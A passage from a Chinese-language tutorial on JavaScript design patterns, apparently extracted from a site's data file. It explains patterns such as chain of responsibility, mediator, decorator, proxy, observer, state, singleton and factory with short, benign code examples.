chainOrder500 = new Chain(order500);\nvar chainOrder200 = new Chain(order200);\nvar chainOrderNormal = new Chain(orderNormal);\n// 然后指定节点在职责链中的顺序：\nchainOrder500.setNextSuccessor(chainOrder200);\nchainOrder200.setNextSuccessor(chainOrderNormal);\n// 最后把请求传递给第一个节点：\nchainOrder500.passRequest(1, true, 500); // 输出：500 元定金预购，得到 100 优惠券\nchainOrder500.passRequest(2, true, 500); // 输出：200 元定金预购，得到 50 优惠券\nchainOrder500.passRequest(3, true, 500); // 输出：普通购买，无优惠券\nchainOrder500.passRequest(1, false, 0); // 输出：手机库存不足\n\n\n\n# 异步的职责链\n\n> 每个节点函数同步返回一个特定的值\"nextSuccessor\"，来表示是否把请求传递给下一个节点。而在现实开发中，我们经常会遇到一些异步的问题，比如我们要在节点函数中发起一个 ajax异步请求，异步请求返回的结果才能决定是否继续在职责链中 passRequest。\n\n// 给 Chain 类再增加一个原型方法 Chain.prototype.next， 表示手动传递请求给职责链中的下一个节点：\n\nChain.prototype.next = function() {\n    return this.successor && this.successor.passRequest.apply(this.successor, arguments);\n};\n\nvar fn1 = new Chain(function() {\n    console.log(1);\n    return 'nextSuccessor';\n});\nvar fn2 = new Chain(function() {\n    console.log(2);\n    var self = this;\n    setTimeout(function() {\n        self.next();\n    }, 1000);\n});\nvar fn3 = new Chain(function() {\n    console.log(3);\n});\nfn1.setNextSuccessor(fn2).setNextSuccessor(fn3);\nfn1.passRequest();\n\n\n\n# 用 AOP 实现职责链\n\nFunction.prototype.after = function(fn) {\n    var self = this;\n    return function() {\n        var ret = self.apply(this, arguments);\n        if (ret === 'nextSuccessor') {\n            return fn.apply(this, arguments);\n        }\n        return ret;\n    }\n};\nvar order = order500yuan.after(order200yuan).after(orderNormal);\norder(1, true, 500); // 输出：500 元定金预购，得到 100 优惠券\norder(2, true, 500); // 输出：200 元定金预购，得到 50 优惠券\norder(1, false, 500); // 输出：普通购买，无优惠券\n// 用 AOP 来实现职责链既简单又巧妙， 但这种把函数叠在一起的方式， 同时也叠加了函数的\n// 作用域， 如果链条太长的话， 也会对性能有较大的影响。\n\n\n\n# 中介者模式\n\n对象之间相互不直接“沟通”，通过一个中介者对这些对象进行通信，从而形成松散耦合。\n中介者模式可以让多个对象之间松耦合，并降低维护成本\n\n中介者模式理解起来十分简单，就像我们生活中去中介租房子，我们租客不关心这是谁的房子，房东不关心他的房子出租给了谁，中介人在租房者和房东出租者之间形成一个中介。这就是中介模式，很简单的理解。\n\nMVC三层模型实体模型（Model）、视图表现层（View）还有控制层（Control/Mediator）。控制层便是位于表现层与模型层之间的中介者。笼统地说MVC也算是中介者模式在框架设计中的一个应用。\n\n\n\n\n# 适用场景\n\n一组定义良好的对象，现在要进行复杂的通信。\n\n定制一个分布在多个类中的行为，而又不想生成太多的子类。\n\n可以看出，中介对象主要是用来封装行为的，行为的参与者就是那些对象，但是通过中介者，这些对象不用相互知道。\n\n\n# 中介模式的优缺点\n\n# 优点\n\n * 降低了系统对象之间的耦合性，使得对象易于独立的被复用。\n * 提高系统的灵活性，使得系统易于扩展和维护。\n\n# 缺点\n\n过度集中化，如果同事对象的交互非常多，而且比较复杂，当这些复杂性全部集中到中介者的时候，会导致中介者对象变得十分复杂，而且难于管理和维护。\n\n\n# 简单案例\n\n飞机场飞机与飞机之间彼此的交流，以调度中心为中介。\n\n//飞机对象的构造函数\nvar feiji = function(name) {\n    this.name = name;\n}\nfeiji.prototype.send = function(msg, to) {\n    console.log(this.name + \"发送了信息\");\n    diaodu.send(msg, to);\n}\nfeiji.prototype.jieshou = function(msg) {\n    console.log(this.name + \"接受到\" + msg);\n}\n//调度中心对象\nvar diaodu = {\n    //将飞机对象通过zhuce函数添加到all对象里\n    all: {},\n    zhuce: function(feiji) {\n        this.all[feiji.name] = feiji;\n    },\n    send: function(msg, to) {\n        this.all[to.name].jieshou(msg);\n    }\n}\nvar feiji1 = new feiji('feiji1');\nvar feiji2 = new feiji('feiji2');\ndiaodu.zhuce(feiji1);\ndiaodu.zhuce(feiji2);\nfeiji1.send(\"我马上降落，还有200米\", feiji2);\n\n\n\n# 装饰者模式\n\n给对象动态添加职责的方式就是装饰者模式，能够在不改变原对象的情况下，在运行的时候给对象添加新的职责。\n\n天气冷了，就添加衣服来保暖；天气热了，就将外套脱下；这个例子很形象地含盖了装饰器的神韵，随着天气的冷暖变化，衣服可以动态的穿上脱下。\n\n给对象添加功能常常使用继承的方式，但是继承的方式并不灵活，还会带来许多问题：一方面会导致超类和子类之间存在强耦合性，当超类改变时，子类也会随之 改变\n\n\n# 使用\n\n开发一个射击游戏，随着时间进行，会吃到道具，火力就越来越强，吃一颗星，不仅可以发普通子弹，还会发射散弹，再吃一颗，不仅可以发射普通子弹和散弹，还有跟踪导弹\n\nvar plane = {\n    fire: function() {\n        console.log('发射子弹');\n    }\n}\nplane.fire();\n//发射子弹\nvar fire1 = plane.fire;\nvar shot = function() {\n    console.log('发射散弹');\n}\nplane.fire = function() {\n    fire1();\n    shot();\n}\nplane.fire();\n//发射子弹 发射散弹\nvar fire2 = plane.fire;\nvar track = function() {\n    console.log('发射跟踪导弹');\n}\nplane.fire = function() {\n    fire2();\n    track();\n}\nplane.fire();\n//发射子弹 发射散弹 发射跟踪导弹\n\n\n给对象动态的增加职责的方式就没有改变对象自身, 一个对象放入另一个对象, 形成了一条装饰链（一个聚合对象），而上面的shot和track也就是是装饰者、装饰函数，当函数执行时，会把请求转给链中的下一个对象\n\n\n\n\n# AOP(面向切面编程)装饰函数\n\n把一些跟核心业务逻辑模块无关的功能抽离出来，这些跟业务逻辑无关的功能通常包括日志统计、安全控制、异常处理等。把这些功能抽离出来之后，再通过“动态织入”的方式参入业务逻辑模块中。\nAOP好处\n\n * 保证业务逻辑模块的纯净和高内聚性\n * 方便复用日志统计等功能模块\n\n# JS实现AOP思路：把一个函数“动态织入”到另一个函数之中。我们使用Function.prototype来实现\n\nFunction.prototype.before = function(beforefn) {\n    var _self = this; //保存原函数引用\n    return function() {\n        beforefn.apply(this, arguments); //执行新函数，修正this\n        return _self.apply(this, arguments); //执行原函数\n    }\n};\n\nFunction.prototype.after = function(afterfn) {\n    var _self = this;\n    return function() {\n        var ret = _self.apply(this, arguments); //不要直接写在return中\n        afterfn.apply(this, arguments);\n        return ret;\n    }\n}\n\n// 把当前的 this 保存起来，这个 this 指向原函数，然后返回一个“代理”函数，这个\n// “代理”函数只是结构上像代理而已，并不承担代理的职责（比如控制对象的访问等）。它的工作\n// 是把请求分别转发给新添加的函数和原函数，且负责保证它们的执行顺序，让新添加的函数在原\n// 函数之前执行（前置装饰），这样就实现了动态装饰的效果\nvar func = function() {\n    console.log(\"2\")\n}\n\nfunc = func.before(function() {\n    console.log(\"1\");\n}).after(function() {\n    console.log(\"3\");\n});\n\nfunc(); //1 2 3\n\n\n把负责打印1和打印3的两个函数通过AOP方式动态插入func函数。通过执行上述函数，控制台一次输出1 2 3。\n\n\n# 缺点\n\n * 装饰链叠加了函数作用域，如果过长也会产生性能问题\n * 如果原函数上保存了属性，返回新函数后属性会丢失\n\n\n# 使用场景\n\n * 扩展一个类的功能\n * 动态增加功能，动态撤销。\n\n\n# 策略模式(算法簇模式)\n\n定义了不同的算法，并且之间可以互相替换，此模式让算法的变化独立于使用算法的客户。\n\n策略模式的重心不是如何实现算法，而是如何组织、调用这些算法，从而让程序结构更灵活，具有更好的维护性和扩展性。\n\n> 定义一系列的算法，把它们一个个封装起来，并且使它们可以相互替换\n\n\n# 简单案例\n\n/*\n示例：公司计算奖金，分A、B、C 三种绩效，计算方式如下\n * 绩效为A，奖金乘以5\n * 绩效为B，奖金乘以4\n * 绩效为C，奖金乘以3\n*/\nvar Strategies = {\n    \"A\": function(salary) {\n        return salary * 5;\n    },\n    \"B\": function(salary) {\n        return salary * 4;\n    },\n    \"C\": function(salary) {\n        return salary * 3;\n    }\n};\nvar caculateBonus = function(level, salary) {\n    return Strategies[level](salary);\n};\nconsole.log(caculateBonus(\"A\", 2000));\n\n\n\n# 策略模式优缺点\n\n# 优点\n\n * 策略模式利用组合、委托和多态等技术和思想，可以有效地避免多重条件选择语句\n * 策略模式提供了对开放-封闭原则的完美支持，将算法封装在独立的对象中，使得它们易于切换，易于理解，易于扩展\n * 策略模式中的算法也可以复用在系统的其他地方，从而避免许多重复的复制粘贴工作\n\n# 缺点\n\n * 会在程序中增加许多策略类或者策略对象\n * 使用策略模式，必须了解所有的策略，才能更好的选择一个合适的策略\n\n\n# 代理模式\n\n一个对象充当另一个对象(本体对象)的接口，所有对本体对象的操作都依靠这个接口对象执行。\n举个例子来描述，你想要给你一个女孩子送花，你又不好意思，于是便委托你朋友帮你送，这时就使用了代理模式\n\n\n# 虚拟代理\n\n把一些开销很大的对象，延迟到真正需要用到这个对象的时候才去创建\n\n# 虚拟代理图片预加载\n\nvar addImg = (function() {\n    var img = document.createElement('img');\n    document.body.appendChild(img);\n    return {\n        setSrc: function(src) {\n            img.src = src;\n        }\n    }\n})();\nvar proxyAddImg = (function() {\n    var img = new Image();\n    img.onload = function() {\n        addImg.setSrc(this.src);\n    }\n    return {\n        setSrc: function(src) {\n            addImg.setSrc('loading.gif');\n            img.src = src;\n        }\n    }\n})();\nproxyAddImg.setSrc('demo.png');\n\n\n# 虚拟代理同步数据\n\n当前台向服务器提交数据时，如果每次前台提交都向服务器发送请求，前台在很短的时间内多次提交数据的话，就会造成很大的服务器性能浪费，网络开销费非常大。--------------- 这时我们使用虚拟代理，防止客户端短时间内频繁操作，我们把客户端的请求合并到一起发送给服务器\n\n<body>\n    <input type=\"checkbox\" id=\"A\">内容一<br>\n    <input type=\"checkbox\" id=\"B\">内容二<br>\n    <input type=\"checkbox\" id=\"C\">内容三<br>\n    <input type=\"checkbox\" id=\"D\">内容四<br>\n    <input type=\"checkbox\" id=\"E\">内容五<br>\n    <input type=\"checkbox\" id=\"F\">内容六<br>\n    <input type=\"checkbox\" id=\"G\">内容七<br>\n    <input type=\"checkbox\" id=\"H\">内容八<br>\n    <script>\n        var synData = function(ID) {\n            console.log(ID + '正在同步到服务器...');\n        }\n        var proxySynData = (function() {\n            var cache = {}, //用对象作为缓存载体\n                timer;\n            return function(ID) {\n                if (!timer) {\n                    timer = setTimeout(function() {\n                        synData(Object.keys(cache).join());\n                        cache = {};\n                        clearTimeout(timer);\n                        timer = null;\n                    }, 2000);\n                }\n                cache[ID] = 1;\n            }\n        })();\n        var list = document.getElementsByTagName('input');\n        for (var i = 0, item; item = list[i]; i++) {\n            item.onclick = function() {\n                if (this.checked) {\n                    proxySynData(this.id);\n                }\n            };\n        }\n    <\/script>\n</body>\n\n\n\n# 缓存代理\n\n缓存一些开销很大的运算结果，将需要重复使用的函数运算结果保存在一个变量里，下次使用时直接使用这个变量就OK了。(这个很好理解)\n\nvar proxyMult = (function() {\n    var cache = {};\n    return function() {\n        var args = Array.prototype.join.call(arguments, ',');\n        if (args in cache) {\n            return cache[args];\n        }\n        return cache[args] = mult.apply(this, arguments);\n    }\n})();\nproxyMult(1, 2, 3, 4); // 输出：24 \nproxyMult(1, 2, 3, 4); // 输出：24\n\n\n\n# 其他代理模式\n\n * 防火墙代理：控制网络资源的访问，保护主题不让“坏人”接近。\n * 远程代理：为一个对象在不同的地址空间提供局部代表，在 Java 中，远程代理可以是另一个虚拟机中的对象\n * 保护代理：用于对象应该有不同访问权限的情况。\n * 智能引用代理：取代了简单的指针，它在访问对象时执行一些附加操作，比如计算一个 对象被引用的次数。\n * 写时复制代理：通常用于复制一个庞大对象的情况。写时复制代理延迟了复制的过程， 当对象被真正修改时，才对它进行复制操作。写时复制代理是虚拟代理的一种变体，DLL （操作系统中的动态链接库）是其典型运用场景。\n\n\n# 使用场景\n\n假如初始化本体对象的开销很大，而且在客户端初始化该本体对象以后程序却很少使用它，这时可以使用代理通过代理替换本体对象的接口从而避免高昂的操作开销。\n\n在 JavaScript 开发中最常用的是虚拟代理和缓存代理，当真正发现不方便直接访问某个对象的时候，再编写代理也不迟。\n\n> 不能滥用代理，有时候仅仅是给代码增加复杂度\n\n\n# 观察者模式(订阅/发布模式)(Vue的双向绑定原理就是基于此模式)\n\n观察者模式在 javascript 中使用非常广泛。它定义了一种一对多的依赖关系，即当一个对象的状态发生改变的时候，所有依赖于它的对象都会得到通知并自动更新，解决了主体对象与观察者之间功能的耦合。\n松耦合的代码、一对多的关系、主体状态变化时，所有依赖被通知、主体和观察者互不知晓。\n\n\n# 适用于以下场景\n\n当一个抽象模型有两个方面，其中一个方面依赖于另一方面。讲这两者封装在独立的对象中可以让它们可以各自独立的改变和复用\n对一个对象状态的更新，需要其他对象同步更新，而且其他对象的数量动态可变。\n对象仅需要将自己的更新通知给其他对象而不需要知道其他对象的细节。\n\n\n# 观察者模式的优缺点\n\n# 优点\n\n观察者模式支持广播通讯。被观察者会向所有的登记过的观察者发出通知\n\n# 缺点\n\n * 如果一个被观察者对象有很多的直接和间接的观察者的话，将所有的观察者都通知到会花费很多时间。\n * 如果在被观察者之间有循环依赖的话，被观察者会触发它们之间进行循环调用，导致系统崩溃。在使用观察者模式是要特别注意这一点。\n * 如果对观察者的通知是通过另外的线程进行异步投递的话，系统必须保证投递是以自恰的方式进行的。\n * 虽然观察者模式可以随时使观察者知道所观察的对象发生了变化，但是观察者模式没有相应的机制使观察者知道所观察的对象是怎么发生变化的。\n\n\n# 观察者模式与中介者模式的区别\n\n观察者模式和中介者模式看起来非常的相似，核心原理都是一样的，这里有一个细微的差别，中介者模式注重状态告知，观察者模式侧重组件数据通信，其实我们这里完全使用观察者模式也可以实现状态告知，不过 但观察者是分发性的，所有的观察者都会受到信息，而且中介者则是单一的，对象的通信由中介者处理。\n\n当组件之间依赖关系简单时，可以直接使用 观察者模式\n当组件之间依赖关系复杂是，需要借助 中介者模式 梳理关系\n\n\n# 简单案例\n\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Document</title>\n</head>\n\n<body>\n    <div>\n        <label>用户名称：<input type=\"text\" id=\"pba\" placeholder=\"请输入用户名称\" /></label><br /><br />\n        <label>生成邮箱：<input type=\"text\" id=\"oba\" readonly /></label>\n        <label>生成ID：<input type=\"text\" id=\"obb\" readonly /></label>\n    </div>\n\n    <script type=\"text/javascript\">\n        //发布者\n        function Publisher(obj) {\n            this.observers = [];\n            var state = obj.value; //让该内容不能直接访问\n\n            //新增两个对于state的操作 获取/更新\n            this.getState = function() {\n                return state;\n            }\n            this.setState = function(value) {\n                state = value;\n                this.notice();\n            }\n            this.obj = obj;\n\n        }\n        Publisher.prototype.addOb = function(observer) {\n            var flag = false;\n            for (var i = this.observers.length - 1; i >= 0; i--) {\n                if (this.observers[i] === observer) {\n                    flag = true;\n                }\n            };\n            if (!flag) {\n                this.observers.push(observer);\n            }\n            return this;\n        }\n        Publisher.prototype.removeOb = function(observer) {\n            var observers = this.observers;\n            for (var i = 0; i < observers.length; i++) {\n                if (observers[i] === observer) {\n                    observers.splice(i, 1);\n                }\n            };\n            return this;\n        }\n        Publisher.prototype.notice = function() {\n            var observers = this.observers;\n            for (var i = 0; i < observers.length; i++) {\n                observers[i].update(this.getState());\n            };\n        }\n        //订阅者\n        function Subscribe(obj) {\n            this.obj = obj;\n            this.update = function(data) {\n                this.obj.value = data;\n            };\n        }\n\n        //实际应用\n        var oba = new Subscribe(document.querySelector(\"#oba\")),\n            obb = new Subscribe(document.querySelector(\"#obb\"));\n\n        var pba = new Publisher(document.querySelector(\"#pba\"));\n\n        pba.addOb(oba);\n        pba.addOb(obb);\n\n        oba.update = function(state) {\n            this.obj.value = state + \"@w3c.com\";\n        }\n        obb.update = function(state) {\n            this.obj.value = \"ID-\" + state;\n        }\n\n        pba.obj.addEventListener('keyup', function() {\n            pba.setState(this.value);\n        });\n    <\/script>\n</body>\n\n</html>\n\n\n\n# 状态模式\n\n> 状态模式的关键是区分事物内部的状态，事物内部状态的改变往往会带来事物的行为改变。\n\n通常我们谈到封装，一般都会优先封装对象的行为，而不是对象的状态。但在状态模式中刚好相反，状态模式的关键是把事物的每种状态都封装成单独的类，跟此种状态有关的行为都被封装在这个类的内部\n\n\n# 简单的案例\n\n> 开关重复按下后的逻辑为 弱光--\x3e强光--\x3e关灯--\x3e弱光\n\n// OffLightState：\nvar OffLightState = function(light) {\n    this.light = light;\n};\nOffLightState.prototype.buttonWasPressed = function() {\n    console.log('弱光'); // offLightState 对应的行为\n    this.light.setState(this.light.weakLightState); // 切换状态到 weakLightState \n};\n// WeakLightState：\nvar WeakLightState = function(light) {\n    this.light = light;\n};\nWeakLightState.prototype.buttonWasPressed = function() {\n    console.log('强光'); // weakLightState 对应的行为\n    this.light.setState(this.light.strongLightState); // 切换状态到 strongLightState \n};\n// StrongLightState：\nvar StrongLightState = function(light) {\n    this.light = light;\n};\nStrongLightState.prototype.buttonWasPressed = function() {\n    console.log('关灯'); // strongLightState 对应的行为\n    this.light.setState(this.light.offLightState); // 切换状态到 offLightState \n};\n\nvar Light = function() {\n    this.offLightState = new OffLightState(this);\n    this.weakLightState = new WeakLightState(this);\n    this.strongLightState = new StrongLightState(this);\n    this.button = null;\n};\n//  button 按钮被按下的事件里，Context 也不再直接进行任何实质性的操作，而是通过self.currState.buttonWasPressed()将请求委托给当前持有的状态对象去执行，代码如下：\nLight.prototype.init = function() {\n    var button = document.createElement('button'),\n        self = this;\n    this.button = document.body.appendChild(button);\n    this.button.innerHTML = '开关';\n    this.currState = this.offLightState; // 设置当前状态\n    this.button.onclick = function() {\n        self.currState.buttonWasPressed();\n    }\n};\n// Light.prototype.setState 方法，状态对象可以通过这个方法来切换 light对象的状态\nLight.prototype.setState = function(newState) {\n    this.currState = newState;\n};\nvar light = new Light();\nlight.init();\n\n\n\n# 状态模式的定义\n\n> 允许一个对象在其内部状态改变时改变它的行为，对象看起来似乎修改了它的类。\n\n * 我们以逗号分割，把这句话分为两部分来看。第一部分的意思是将状态封装成独立的类，并 将请求委托给当前的状态对象，当对象的内部状态改变时，会带来不同的行为变化。电灯的例子 足以说明这一点，在 off 和 on 这两种不同的状态下，我们点击同一个按钮，得到的行为反馈是截 然不同的。\n * 第二部分是从客户的角度来看，我们使用的对象，在不同的状态下具有截然不同的行为，这 个对象看起来是从不同的类中实例化而来的，实际上这是使用了委托的效果。\n\n\n# 状态模式的通用结构\n\n * 一个上下文的类（Context）（类似于上述代码的 Light 类）\n * Light 的构造函数中，我们要创建每一个状态类的实例对象，Context 将持有这些状态对象的引用，以便把请求委托给状态对象。\n\n\n# 状态模式的优缺点\n\n# 优点\n\n * 状态模式定义了状态与行为之间的关系，并将它们封装在一个类里。通过增加新的状态 类，很容易增加新的状态和转换。\n * 避免 Context 无限膨胀，状态切换的逻辑被分布在状态类中，也去掉了 Context 中原本过 多的条件分支\n * 用对象代替字符串来记录当前状态，使得状态的切换更加一目了然。\n * Context 中的请求动作和状态类中封装的行为可以非常容易地独立变化而互不影响。\n\n# 缺点\n\n * 中定义许多状态类\n * 逻辑分散在状态类中 无法在一个地方就看出整个状态机的逻辑。\n\n\n# 状态模式和策略模式的关系\n\n * 状态模式和策略模式像一对双胞胎，它们都封装了一系列的算法或者行为，它们的类图看起来几乎一模一样，但在意图上有很大不同，因此它们是两种迥然不同的式。\n * 策略模式和状态模式的相同点是，它们都有一个上下文、一些策略或者状态类，上下文把请求委托给这些类来执行。\n\n\n# 适配器模式\n\n> 适配器模式的作用是解决两个软件实体间的接口不兼容的问题。使用适配器模式之后，原本由于接口不兼容而不能工作的两个软件实体可以一起工作。\n\n当我们试图调用模块或者对象的某个接口时，却发现这个接口的格式并不符合目前的需求。 这时候有两种解决办法，第一种是修改原来的接口实现，但如果原来的模块很复杂，或者我们拿 到的模块是一段别人编写的经过压缩的代码，修改原接口就显得不太现实了。第二种办法是创建 一个适配器，将原接口转换为客户希望的另一个接口，客户只需要和适配器打交道。\n\n如果现有的接口已经能够正常工作，那我们就永远不会用上适配器模式。适配器模式是一种 “亡羊补牢”的模式，没有人会在程序的设计之初就使用它。因为没有人可以完全预料到未来的 事情，也许现在好好工作的接口，未来的某天却不再适用于新系统，那么我们可以用适配器模式 把旧接口包装成一个新的接口，使它继续保持生命力。\n\n\n# 总结\n\n * 适配器模式主要用来解决两个已有接口之间不匹配的问题，它不考虑这些接口是怎样实 现的，也不考虑它们将来可能会如何演化。适配器模式不需要改变已有的接口，就能够 使它们协同作用。\n\n * 装饰者模式和代理模式也不会改变原有对象的接口，但装饰者模式的作用是为了给对象 增加功能。装饰者模式常常形成一条长的装饰链，而适配器模式通常只包装一次。代理 模式是为了控制对对象的访问，通常也只包装一次。",normalizedContent:"# javascript设计模式\n\n\n# 什么是设计模式?\n\n模式是一种可复用的解决方案，可用于解决项目中遇到的常见问题，将解决问题的方法制作成模板，并且这些模板可应用于多种不同的情况。如在编写的javascript应用程序的实例中，同类型问题共用一种解决方法。\n所有设计模式都有一个共同的目的，那就是让编程更加模块化，系统化，明确化。 在面向对象软件设计过程中针对特定问题的简洁而优雅的解决方案。\n\n\n# 为什么使用设计模式\n\n 1. 使用已经验证的解决方案，可以快速可靠解决项目开发中遇到的问题\n 2. 复用代码，使代码更加简洁\n\n\n# 设计模式的六大原则\n\n总原则－开闭原则\n\n对扩展开放，对修改封闭。 在程序需要进行拓展的时候，不能去修改原有的代码，而是要扩展原有代码，实现一个热插拔的效果。所以一句话概括就是：为了使程序的扩展性好，易于维护和升级。 想要达到这样的效果，我们需要使用接口和抽象类等。\n\n 1. 单一职责原则 不要存在多于一个导致类变更的原因，也就是说每个类应该实现单一的职责，否则就应该把类拆分。\n\n 2. 里氏替换原则（liskov substitution principle） 任何基类可以出现的地方，子类一定可以出现。里氏替换原则是继承复用的基石，只有当衍生类可以替换基类，软件单位的功能不受到影响时，基类才能真正被复用，而衍生类也能够在基类的基础上增加新的行为。 里氏代换原则是对“开-闭”原则的补充。实现“开闭”原则的关键步骤就是抽象化。而基类与子类的继承关系就是抽象化的具体实现，所以里氏代换原则是对实现抽象化的具体步骤的规范。里氏替换原则中，子类对父类的方法尽量不要重写和重载。因为父类代表了定义好的结构，通过这个规范的接口与外界交互，子类不应该随便破坏它。\n\n 3. 依赖倒转原则（dependence inversion principle） 面向接口编程，依赖于抽象而不依赖于具体。写代码时用到具体类时，不与具体类交互，而与具体类的上层接口交互。\n\n 4. 接口隔离原则（interface segregation principle） 每个接口中不存在子类用不到却必须实现的方法，如果不然，就要将接口拆分。使用多个隔离的接口，比使用单个接口（多个接口方法集合到一个的接口）要好。\n\n 5. 迪米特法则（最少知道原则）（demeter principle） 一个类对自己依赖的类知道的越少越好。无论被依赖的类多么复杂，都应该将逻辑封装在方法的内部，通过public方法提供给外部。这样当被依赖的类变化时，才能最小的影响该类。 最少知道原则的另一个表达方式是：只与直接的朋友通信。类之间只要有耦合关系，就叫朋友关系。耦合分为依赖、关联、聚合、组合等。我们称出现为成员变量、方法参数、方法返回值中的类为直接朋友。局部变量、临时变量则不是直接的朋友。我们要求陌生的类不要作为局部变量出现在类中。\n\n 6. 合成复用原则（composite reuse principle） 尽量首先使用合成/聚合的方式，而不是使用继承。\n\n\n# 单体模式(单例模式)\n\n单体模式 就是保证一个类仅有一个实例，例如浏览器中的window对象。实际上，在事项对象的字面量创建对象时，就是正在创建一个单体。\n单体模式（singleton pattern）就是确保某一个类只有一个实例，而且自行实例化并向整个系统提供这个实例。\n\n\n# 简单案例\n\n> 单例模式的实现是一个变量来标志当前是否已经为某个类创建过对象，如果是，则在下一次获取该类的实例时，直接返回之前创建的对象。\n\nvar single = (function() {\n    var instance;\n\n    function init() {\n        //define private methods and properties\n        //do something\n        return {\n            //define public methods and properties\n        };\n    }\n\n    return {\n        // 获取实例\n        getinstance: function() {\n            if (!instance) {\n                instance = init();\n            }\n            return instance;\n        }\n    }\n})();\n\nvar obj1 = single.getinstance();\nvar obj2 = single.getinstance();\n\nconsole.log(obj1 === obj2); //true\n\n\n\n# 适用场合\n\n * 在 javascript开发中，单体模式的用途同样非常广泛。试想一下，当单击登录按钮的时候，页面中会出现一个登录浮窗，而这个登录浮窗是唯一的，无论单击多少次登录按钮，这个浮窗都只会被创建一次，那么这个登录浮窗就适合用单体模式来创建。\n * 要求生成唯一序列号的环境\n * 整个项目需要一个共享访问点或共享数据\n * 创建一个对象消耗资源过多\n\n\n# 工厂模式\n\n工厂模式是用来创建对象的一种最常用的设计模式。不暴露创建对象的具体逻辑，而是将将逻辑封装在一个函数中，那么这个函数就可以被视为一个工厂。\n工厂模式分为三种：简单工厂模式、工厂方法模式、抽象工厂模式\n\n\n# 简单工程模式\n\n简单工厂模式又叫静态工厂模式，由一个工厂对象决定创建某一种产品对象类的实例。主要用来创建同一类对象。对于非大型的前端应用来说，灵活使用简单工厂其实就能解决大部分问题。\n\n简单工厂只能作用于创建的对象数量较少，对象的创建逻辑不复杂时使用。\n\n//user类\nclass user {\n    //构造器\n    constructor(opt) {\n        this.name = opt.name;\n        this.viewpage = opt.viewpage;\n    }\n\n    //静态方法\n    static getinstance(role) {\n        switch (role) {\n            case 'superadmin':\n                return new user({\n                    name: '超级管理员',\n                    viewpage: ['首页', '通讯录', '发现页', '应用数据', '权限管理']\n                });\n                break;\n            case 'admin':\n                return new user({\n                    name: '管理员',\n                    viewpage: ['首页', '通讯录', '发现页', '应用数据']\n                });\n                break;\n            case 'user':\n                return new user({\n                    name: '普通用户',\n                    viewpage: ['首页', '通讯录', '发现页']\n                });\n                break;\n            default:\n                throw new error('参数错误, 可选参数:superadmin、admin、user')\n        }\n    }\n}\n//调用\nlet superadmin = user.getinstance('superadmin');\nlet admin = user.getinstance('admin');\nlet normaluser = user.getinstance('user');\nconsole.log(superadmin);\nconsole.log(admin);\nconsole.log(normaluser);\n\n\n\n# 工厂方法模式\n\n与简单工厂模式相比，主要区别就是它不是另外使用一个对象或者类来创建实例，而是使用一个子类。工厂是一个将其成员对象的实例化推迟到子类中进行的类。\n\nclass user {\n    constructor(name = '', viewpage = []) {\n        //new.target属性允许你检测函数或构造方法是否是通过new运算符被调用的。在通过new运算符被初始化的函数或构造方法中，new.target返回一个指向构造方法或函数的引用。在普通的函数调用中，new.target 的值是undefined。\n        if (new.target === user) {\n            throw new error('抽象类不能实例化!');\n        }\n        this.name = name;\n        this.viewpage = viewpage;\n    }\n}\nclass userfactory extends user {\n    constructor(name, viewpage) {\n        super(name, viewpage)\n    }\n    create(role) {\n        switch (role) {\n            case 'superadmin':\n                return new userfactory('超级管理员', ['首页', '通讯录', '发现页', '应用数据', '权限管理']);\n                break;\n            case 'admin':\n                return new userfactory('普通用户', ['首页', '通讯录', '发现页']);\n                break;\n            case 'user':\n                return new userfactory('普通用户', ['首页', '通讯录', '发现页']);\n                break;\n            default:\n                throw new error('参数错误, 可选参数:superadmin、admin、user')\n        }\n    }\n}\nlet userfactory = new userfactory();\nlet superadmin = userfactory.create('superadmin');\nlet admin = userfactory.create('admin');\nlet user = userfactory.create('user');\n\n\n\n# 抽象工厂模式\n\n抽象工厂模式并不直接生成实例，而是用于对产品类簇的创建, 不负责创建某一类产品的实例。\n\nclass user {\n    constructor(type) {\n        if (new.target === user) {\n            throw new error('抽象类不能实例化!')\n        }\n        this.type = type;\n    }\n}\n\nclass userofwechat extends user {\n    constructor(name) {\n        super('wechat');\n        this.name = name;\n        this.viewpage = ['首页', '通讯录', '发现页']\n    }\n}\n\nclass userofqq extends user {\n    constructor(name) {\n        super('qq');\n        this.name = name;\n        this.viewpage = ['首页', '通讯录', '发现页']\n    }\n}\n\nclass userofweibo extends user {\n    constructor(name) {\n        super('weibo');\n        this.name = name;\n        this.viewpage = ['首页', '通讯录', '发现页']\n    }\n}\n\nfunction getabstractuserfactory(type) {\n    switch (type) {\n        case 'weixin':\n            return userofwechat;\n            break;\n        case 'qq':\n            return userofqq;\n            break;\n        case 'weibo':\n            return userofweibo;\n            break;\n        default:\n            throw new error('参数错误, 可选参数:weixin  qq  weibo')\n    }\n}\nlet wechatuserclass = getabstractuserfactory('weixin');\nlet qquserclass = getabstractuserfactory('qq');\nlet weibouserclass = getabstractuserfactory('weibo');\n\nlet wechatuser = new wechatuserclass('微信小孙');\nlet qquser = new qquserclass('qq老马');\nlet weibouser = new weibouserclass('微博小李');\nconsole.log(wechatuser)\nconsole.log(qquser)\nconsole.log(weibouser)\n\n\n\n# 使用场合\n\n * 创建一些用不同方式实现统一接口的对象，那么可以使用一个工厂方法或者简单工厂对象来简化实现过程。\n * 对象要进行复杂的并且彼此相关的设置的时候，那么工厂模式可以很显著的减少每种对象的代码量。将特定的设置代码提取出来会使得代码有极大地提升。并且能优化结构便于维护。\n * 许多小型对象组成一个大对象\n\n\n# 迭代器模式\n\n提供一种方法顺序访问一个聚合对象中的各个元素，而又不需要暴露该对象的内部表示。javascript内置了迭代器==>javascript 的 array.prototype.foreach\n\n\n# 内部迭代器\n\n已经定义好了迭代规则，它完全接手整个迭代过程，外部只需一次初始调用。\n\n# jquery中的迭代器\n\n$.each([1, 2, 3], function(i, n) {\n    console.log(\"当前下标为：\" + i + \" 当前元素为：\" + n);\n});\n\n\n# 原生javascript实现\n\nvar each = function(ary, callback) {\n    for (var i = 0, l = ary.length; i < l; i++) {\n        callback.call(ary[i], i, ary[i]);\n    }\n};\neach([1, 2, 3], function(i, n) {\n    console.log(\"当前下标为：\" + i + \" 当前元素为：\" + n);\n});\n\n\n\n# 外部迭代器\n\n必须显式地请求迭代下一个元素。 外部迭代器虽然调用方式相对复杂，但它的适用面更广，也能满足更多变的需求。内部迭代 器和外部迭代器在实际生产中没有优劣之分，究竟使用哪个要根据需求场景而定。\n\n// 外部迭代器\nvar iterator = function(obj) {\n    var current = 0,\n        next = function() {\n            current++;\n        